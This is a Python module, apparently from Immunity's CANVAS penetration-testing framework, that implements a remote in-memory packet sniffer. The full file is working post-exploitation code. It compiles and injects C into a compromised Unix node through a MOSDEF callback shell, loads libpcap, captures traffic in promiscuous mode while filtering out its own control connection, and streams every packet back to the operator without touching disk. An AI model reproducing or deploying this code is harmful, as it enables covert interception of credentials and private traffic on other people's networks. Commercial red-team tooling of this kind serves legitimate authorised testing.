#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2004
# http://www.immunityinc.com/CANVAS/ for more information

#
# This is an implementation of an in-memory network sniffer using libpcap
# Should work fine on linux and osx/{intel32/amd64}
#
# Protocol: Instead of using multiple sockets (control/data transfer)
# we multiplex everything over the single callback connection that
# we have. By calling pcap_get_selectable_fd, we get a descriptor that
# can be used in non-blocking mode with select().
#
# + We call select() waiting to read from both pcap and mosdef descriptors.
# + We transmit everything that we read from the pcap descriptor back to CANVAS
#   (network packets and their metadata)
# + If we can read from the mosdef descriptor we cleanly terminate
#   the packet dispatching loop and send the 4 bytes that we received back verbatim
#   and the number of packets that we captured as an unsigned long
# + Once CANVAS receives them, it knows that the sniffer has terminated successfully
#
# This module should be a good example of how to use the remote resolving support
# in MOSDEF.
#
# Command-line usage: One can stop the sniffer with CTRL-C
#

import sys
if "." not in sys.path: sys.path.append(".")

import os
import struct
import getopt
import datetime

from localNode import localNode
from exploitutils import hexify
from libs.newsmb.Struct import Struct
from MOSDEF.unixremoteresolver import LibraryNotLoaded, SymbolNotResolved, NoResolver
from timeoutsocket import Timeout
from ExploitTypes.localcommand import LocalCommand

NAME                   = "pcap_sniffer"
DESCRIPTION            = "LIBPCAP remote mosdef sniffer"
VERSION                = "0.5"
GTK2_DIALOG            = "dialog.glade2"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """
This is a remote in-memory (does not touch disk) packet sniffer that sits
on top of the remote unix symbol resolving/library loading functionality.

Currently, it works on Linux/x86 and OSX (x86/x64). You can use it either
via the graphical interface or the commandline.

Examples via commandlineInterface.py (Stop with CTRL-C):

See options:
Linux/MOSDEF# runmodule pcap_sniffer -h

Capture straight to pcap dumpfile:
Linux/MOSDEF# runmodule pcap_sniffer -O iface:eth0 -O promisc:1

Capture to pcap dumpfile and see packets in realtime via wireshark:
Linux/MOSDEF# runmodule pcap_sniffer -O iface:eth0 -O promisc:1 -O wireshark:1
"""

PROPERTY         = {}
PROPERTY['SITE'] = "Local"
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Unix", "All"] ]

DATALINK_ETHERNET = 1
# This is the trigger that we send in order to terminate the sniffer
# loop at the remote end. We send TRIGGER and when we receive it
# we know that the sniffer has stopped.
TRIGGER       = '\xFF\xAA\xFF\xAA'


class PCAPHeader(Struct):
    st = [
        ['magic_number'  , '<I', 0xa1b2c3d4],
        ['version_major' , '<H', 2],
        ['version_minor' , '<H', 4],
        ['thiszone'      , '<I', 0],
        ['sigfigs'       , '<I', 0],
        ['snaplen'       , '<I', 65535],
        ['network'       , '<I', DATALINK_ETHERNET],
    ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result     = ""
        self.name       = NAME

        self.snaplen    = 65535  # Amount of bytes to capture per packet
        self.promisc    = 1

        self.timeout    = 200    # Some combinations of os/libpcap do not
                                 # support non-blocking io with pcap_next_ex
                                 # For those cases, setting a timeout will do
                                 # the right thing (pcap_next_ex will return with 0)

        self.interface  = 'eth0' # Network interface to capture from
        self.filter     = ''     # User specified packet filter expression
        self.pipe       = None   # File object corresponding to self.pipename
        self.file       = None   # File object corresponding to self.filename
        self.filename   = None   # PCAP output filename
        self.datalink   = None   # PCAP datalink type
        self.dirname    = None   # Directory name for pcap files
        self.wireshark  = 0      # if 1, start wireshark for realtime display

        self.pipename   = '/tmp/canvaspipe'
        self.wireshark_path  = '/usr/bin/wireshark'

    def close_pipe(self):
        self.pipe = None

    def close_file(self):
        if self.file: self.file.close()
        self.file = None

    def terminate(self, node):
        self.log('Terminating sniffer..')
        node.shell.writebuf(TRIGGER)
        buf = []
        while True:
            buf.append(node.shell.reliableread(1))
            if hexify(buf[-4:]) == hexify(TRIGGER):
                self.log('Successfully stopped sniffer at remote end')
                break

        packet_count = node.shell.readlong()
        self.log('Captured %d packets' % packet_count)

        # receive pcap_stat results if any
        ret = node.shell.readint()
        if ret == 0:
            self.log('Network interface specific statistics:')
            self.log('Received: %d, dropped: %d' % (node.shell.readint(),
                                                    node.shell.readint()))
        self.close_pipe()
        self.close_file()

    def fail(self):
        self.close_pipe()
        self.close_file()
        self.setInfo('%s - done (ERROR)' % NAME)

    def make_pcap_pipe(self):
        if not os.path.exists(self.wireshark_path) or \
           not os.path.isfile(self.wireshark_path) or \
           not os.access(self.wireshark_path, os.X_OK):
            # Missing wireshark executable
            self.log('Could not execute %s, not enabling live packet streaming' % self.wireshark_path)
            return

        header = PCAPHeader()
        header['network'] = self.datalink

        if os.path.exists(self.pipename):
            os.remove(self.pipename)
            os.mkfifo(self.pipename)
        else:
            os.mkfifo(self.pipename)

        os.system('%s -k -i %s &' % (self.wireshark_path, self.pipename))
        self.pipe = open(self.pipename, "w")
        self.send_to_pipe(header.pack())

    def make_pcap_file(self):
        if not self.filename:
            t = datetime.datetime.now()
            filename = 'dumpfile_%s.pcap' % t.strftime("%m%d%Y%H%M%S")
        else:
            filename = self.filename

        filename = os.path.join(self.dirname, filename)
        try:
            self.file = open(filename, 'wb')
            header = PCAPHeader()
            header['network'] = self.datalink
            self.file.write(header.pack())
            self.log('Saving packets to %s' % filename)
        except:
            self.log('Could not open %s for output, PCAP writing aborted' % filename)


    def send_to_pipe(self, packet):
        try:
            self.pipe.write(packet)
        except:
            self.log('You probably closed wireshark while the sniffer was running.  No longer attempting to send packets to wireshark')
            self.pipe = None

    def send_to_file(self, packet):
        try:
            self.file.write(packet)
        except Exception, ex:
            self.log('PCAP output error: %s' % ex)
            self.log('WARNING: PCAP file output aborted')
            self.file = None

    def rewrite_packet(self, data, sec, usec, olen):
        sec  &= 0xFFFFFFFF
        usec &= 0xFFFFFFFF

        return struct.pack('<I', sec) + struct.pack('<I', usec) + \
               struct.pack('<I', len(data)) + struct.pack('<I', olen) + \
               data

    def getargs(self):
        self.snaplen        = int(self.argsDict.get('snaplen', self.snaplen))
        self.promisc        = int(self.argsDict.get('promisc', self.promisc))
        self.wireshark      = int(self.argsDict.get('wireshark', self.wireshark))
        self.filename       = self.argsDict.get('filename', self.filename)
        self.wireshark_path = self.argsDict.get('wireshark_path', self.wireshark_path)

        # The following need to be ascii because they are passed into the
        # string that gets compiled by MOSDEF and apparently MOSDEF doesn't like
        # unicode
        self.interface = self.argsDict.get('iface', self.interface).encode('ASCII')
        self.filter    = self.argsDict.get('filter', self.filter).encode('ASCII')

    def run(self):
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()

        node     = self.argsDict["passednodes"][0]
        type     = node.nodetype
        nodename = node.getname()

        if isinstance(node, localNode):
            self.log('[EE] Node of type %s not supported' % type)
            self.fail()
            return 0

        if "Unix Shell" not in node.capabilities:
            self.log("[EE] Node of type %s not supported yet" % type)
            self.fail()
            return 0

        self.dirname = self.output(ip=node.get_interesting_interface(),
                                   subdir='pcap_files')

        # we need to abstract the following, linux/x64 may be added
        lp64 = False
        if hasattr(node.shell, "LP64"):
            lp64 = node.shell.LP64

        #
        # Verify that we have a working remote resolver
        #
        try:
            remoteip, remoteport = node.shell.getpeername()
        except NoResolver:
            self.log_error("Remote resolver is currently not enabled")
            self.log_error("Bailing")
            return 0
        except Exception as e:
            self.log_error('Unexpected error: %s' % str(e))
            return 0

        self.log('getpeername(): %s:%d' % (remoteip, remoteport))
        filter_string = 'not (host %s and tcp port %d)' % (remoteip, remoteport)

        if self.filter: filter_string += ' and %s' % self.filter
        vars = {
            'SNAPLEN'   : self.snaplen,
            'PROMISC'   : self.promisc,
            'TIMEOUT'   : self.timeout,
            'INTERFACE' : self.interface,
            'FD'        : node.shell.fd,
            'FILTER'    : filter_string,
        }

        code = """
        #import "local"  , "sendint" as "sendint"
        #import "local"  , "sendlong" as "sendlong"
        #import "local"  , "sendstring" as "sendstring"
        #import "local"  , "sendpointer" as "sendpointer"
        #import "local"  , "sendblock2self" as "sendblock2self"
        #import "local"  , "read" as "read"
        #import "local"  , "debug" as "debug"

        #import "REMOTE" , "malloc" as "malloc"
        #import "REMOTE" , "strncpy" as "strncpy"
        #import "REMOTE" , "strlen" as "strlen"
        #import "REMOTE" , "select" as "rselect"
        #import "REMOTE" , "memset" as "memset"

        #import "REMOTE" , "%s|pcap_lib_version" as "pcap_lib_version"
        #import "REMOTE" , "%s|pcap_findalldevs" as "pcap_findalldevs"
        #import "REMOTE" , "%s|pcap_open_live" as "pcap_open_live"
        #import "REMOTE" , "%s|pcap_next_ex" as "pcap_next_ex"
        #import "REMOTE" , "%s|pcap_compile" as "pcap_compile"
        #import "REMOTE" , "%s|pcap_setfilter" as "pcap_setfilter"
        #import "REMOTE" , "%s|pcap_get_selectable_fd" as "pcap_get_selectable_fd"
        #import "REMOTE" , "%s|pcap_setnonblock" as "pcap_setnonblock"
        #import "REMOTE" , "%s|pcap_close" as "pcap_close"
        #import "REMOTE" , "%s|pcap_datalink" as "pcap_datalink"
        #import "REMOTE" , "%s|pcap_stats" as "pcap_stats"

        #import "int"    , "SNAPLEN" as "SNAPLEN"
        #import "int"    , "PROMISC" as "PROMISC"
        #import "int"    , "TIMEOUT" as "TIMEOUT"
        #import "int"    , "FD" as "FD"
        #import "string" , "INTERFACE" as "INTERFACE"
        #import "string" , "FILTER" as "FILTER"

        struct pcap_if {
            void *next;
            char *name;            // name to hand to "pcap_open_live()"
            char *description;     // textual description of interface, or NULL
            void *addresses;
            int flags;    // PCAP_IF_ interface flags
        };

        struct pcap_pkthdr {
            unsigned long sec;
            unsigned long usec;
            unsigned int caplen;
            unsigned int len;
        };

        struct pcap_stat {
            unsigned int ps_recv;
            unsigned int ps_drop;
            unsigned int ps_ifdrop;
        };

        struct bpf_program {
            unsigned int bf_len;
            void *bf_insns;
        };

        struct timeval {
            unsigned long sec;
            unsigned long usec;
        };

        unsigned int FDMASK(int fd)
        {
        unsigned int mask;
        int shift;

        shift = fd % 32;
        mask = 1 << shift;

        return mask;
        }

        unsigned int FDELT(int fd)
        {
        unsigned int delta;
        delta = fd / 32;
        return delta;
        }

        void
        FD_SET(int fd, unsigned int *fds)
        {
        unsigned int delta;
        unsigned int mask;

        delta = FDELT(fd);
        mask = FDMASK(fd);

        fds[delta] = fds[delta] | mask;

        return;
        }

        void
        FD_CLR(int fd, unsigned int *fds)
        {
        unsigned int delta;
        unsigned int mask;

        delta = FDELT(fd);
        mask = FDMASK(fd);
        mask = 0 - mask;
        mask = mask - 1;

        fds[delta] = fds[delta] & mask;

        return;
        }

        int FD_ISSET(int fd, unsigned int *fds)
        {
        unsigned int delta;
        unsigned int mask;
        int isset;

        delta = FDELT(fd);
        mask = FDMASK(fd);

        if (fds[delta] & mask)
        {
            return 1;
        }
        else
        {
            return 0;
        }
        }



        void main()
        {

        int ret;
        int status;
        int pcap_fd;
        char *s;
        void *pcap;
        char *buf;
        char erbuf[256]; // PCAP_ERRBUF_SIZE
        int maxfd;
        int aligned_maxfd;
        unsigned int *readfds;
        unsigned long counter;

        struct pcap_pkthdr *ptr;
        struct pcap_if *alldevsp;
        struct bpf_program bpf;
        struct pcap_stat pstat;

        counter = 0;

        // GET PCAP VERSION
        s = pcap_lib_version();
        sendstring(s);

        // GET LIST OF NETWORK INTERFACES
        ret = pcap_findalldevs(&alldevsp, erbuf);
        sendint(ret);

        if (ret == -1) {
            sendstring(erbuf);
        }

        while (alldevsp != NULL) {
            sendstring(alldevsp->name);
            sendstring(":");
            if (alldevsp->description != NULL) {
                sendstring(alldevsp->description);
            } else {
               sendstring("no description");
            }

            sendstring("!");
            alldevsp = alldevsp->next;
        }

        sendstring("done");


        // OPEN LIVE INTERFACE
        pcap = pcap_open_live(INTERFACE, SNAPLEN, PROMISC, TIMEOUT, erbuf);
        sendpointer(pcap);
        if (pcap == NULL) {
            sendstring(erbuf);
            return;
        }

        // GET SELECTABLE FD
        pcap_fd = pcap_get_selectable_fd(pcap);
        sendint(pcap_fd);

        if (pcap_fd == -1) {
            return;
        }

        // SET NON-BLOCKING MODE
        ret = pcap_setnonblock(pcap, 1, erbuf);
        sendint(ret);

        if (ret == -1) {
            sendstring(erbuf);
            return;
        }

        // COMPILE FILTER
        ret = pcap_compile(pcap, &bpf, FILTER, 1, 0);
        sendint(ret);
        if (ret != 0) {
            return;
        }

        // SET FILTER
        ret = pcap_setfilter(pcap, &bpf);
        sendint(ret);
        if (ret != 0) {
            return;
        }

        // GET DATALINK
        ret = pcap_datalink(pcap);
        sendint(ret);

        // SELECT STUFF
        if (pcap_fd > FD) {
            maxfd = pcap_fd;
        }
        else {
            maxfd = FD;
        }

        aligned_maxfd = maxfd +7;
        aligned_maxfd = aligned_maxfd / 8;

        readfds = malloc(aligned_maxfd * 4);
        memset(readfds, 0, aligned_maxfd * 4);

        // MAIN LOOP
        while (1) {
            FD_CLR(pcap_fd, readfds);
            FD_CLR(FD, readfds);
            FD_SET(pcap_fd, readfds);
            FD_SET(FD, readfds);

            ret = rselect(maxfd + 1, readfds, NULL, NULL, NULL);

            if (ret == -1) {
                sendint(ret);
                return;
            }

            if (ret > 0) {
                status = FD_ISSET(FD, readfds);
                if (status == 1) {
                    // Terminate
                    read(FD, &ret, 4);
                    sendint(ret);
                    sendlong(counter);
                    ret = pcap_stats(pcap, &pstat);
                    sendint(ret);

                    if (ret == 0) {
                        sendint(pstat.ps_recv);
                        sendint(pstat.ps_drop);
                    }

                    pcap_close(pcap);
                    return;
                }
            }

            do {
                ret = pcap_next_ex(pcap, &ptr, &buf);

                if (ret != 0) {
                    sendint(ret);

                    if (ret == -1) {
                        return;
                    }

                    if (ret == 1) {
                        counter = counter + 1;
                        sendlong(ptr->sec);
                        sendlong(ptr->usec);
                        sendint(ptr->caplen);
                        sendint(ptr->len);
                        sendblock2self(buf, ptr->caplen);
                    }
                }
            } while (ret != 0);
        }
        }
        """

        if lp64:
            code = code.replace("REMOTE", "remote64")
        else:
            code = code.replace("REMOTE", "remote")

        if "osx" in node.capabilities:
            libs = ["libpcap.dylib", "/usr/lib/libpcap.dylib", "/usr/lib/libpcap.A.dylib"]
        else:
            # List of foreign libraries to attempt to load
            # If one fails to load the next is tried
            libs = ["libpcap.so.0.8", "libpcap.so.1", "libpcap.so.1.0", "libpcap.so.1.1",
                    "/usr/lib/libpcap.so", "/usr/lib/libpcap.so.1", "/usr/lib/libpcap.so.0.8",
                    "/usr/lib/libpcap.so.1.0", "/usr/lib/libpcap.so.1.1", "/usr/lib/libpcap.so.0.9"]

        request = None
        for lib in libs:
            mycode = code.replace('%s', lib)
            self.log("Trying to load %s.." % lib)
            node.shell.clearfunctioncache()
            try:
                request = node.shell.compile(mycode, vars)
                break
            except LibraryNotLoaded, ex:
                self.log('%s' % ex)
            except SymbolNotResolved, ex:
                self.log('ERROR: %s' % ex)
                self.fail()
                return 0

        if not request:
            self.log('Could not load foreign library, giving up..')
            self.fail()
            return 0

        node.shell.sendrequest(request)
        self.log("remote pcap_lib_version: %s" % node.shell.readstring())
        s = node.shell.readint(signed=True);
        self.log("pcap_findalldevs: %d" % s)

        if s == -1: self.log("pcap error: %s" % node.shell.readstring())
        buf = ''
        while buf[-4:] != 'done':
            buf += node.shell.readstring()

        if buf == "done":
            self.log("no available pcap interfaces for capture, PERM issue")
        else:
            # Get list of interfaces from pcap_findalldevs()
            self.log("="*20 + " INTERFACES " + "="*20 + "\n" + buf.replace('done','').replace('!', '\n'))

        self.log('Opening %s for live capture..' % self.interface)
        ret = node.shell.readpointer()
        if ret == 0:
            self.log('Error: %s' % node.shell.readstring())
            self.fail()
            node.shell.leave()
            return 0
        else:
            self.log('%s open at 0x%x, promisc: %d, snaplen: %d' % (self.interface,
                                                                    ret,
                                                                    self.promisc,
                                                                    self.snaplen))
        self.log('Retrieving select-able FD')
        ret = node.shell.readint(signed=True)

        if ret == -1:
            self.log('Error: select-able FD not supported')
            self.fail()
            node.shell.leave()
            return 0

        self.log('Setting non-blocking mode')
        ret = node.shell.readint(signed=True)
        if ret == -1:
            self.log('Error: %s' % node.shell.readstring())
            self.fail()
            node.shell.leave()
            return 0

        self.log('Compiling packet filter: %s' % filter_string)
        ret = node.shell.readint()

        if ret != 0:
            self.log('Error when compiling packet filter, aborting')
            self.fail()
            node.shell.leave()
            return 0

        self.log('Setting packet filter..')
        ret = node.shell.readint()
        if ret != 0:
            self.log('Error when setting packet filter, aborting')
            self.fail()
            node.shell.leave()
            return 0

        ret = node.shell.readint()
        self.log('Datalink type: %d' % ret)
        self.datalink = ret
        self.log('Capturing...')
        if self.wireshark == 1: self.make_pcap_pipe()
        self.make_pcap_file()

        try:
            while True:
                try:
                    node.shell.connection.set_timeout(1)
                    status = node.shell.readint(signed=True)
                    node.shell.connection.set_timeout(None)
                    if (status == -1):
                        self.log('Error during packet capture')
                        node.shell.leave()
                        self.fail()
                        return 0
                except Timeout:
                    node.shell.connection.set_timeout(None)
                    if self.getState() == self.HALT: break
                    continue

                sec    = node.shell.readlong()
                usec   = node.shell.readlong()
                caplen = node.shell.readint()
                olen   = node.shell.readint()
                buf    = self.rewrite_packet(node.shell.readblock(), sec, usec, olen)

                if self.pipe: self.send_to_pipe(buf)
                if self.file: self.send_to_file(buf)
                if self.getState() == self.HALT: break
        except KeyboardInterrupt:
            # We need this for command line execution
            self.log('Caught CTRL-C, aborting..')
            node.shell.connection.set_timeout(None)

        self.terminate(node)
        node.shell.leave()
        self.setInfo("%s - done (success)"%(NAME))
        return 1
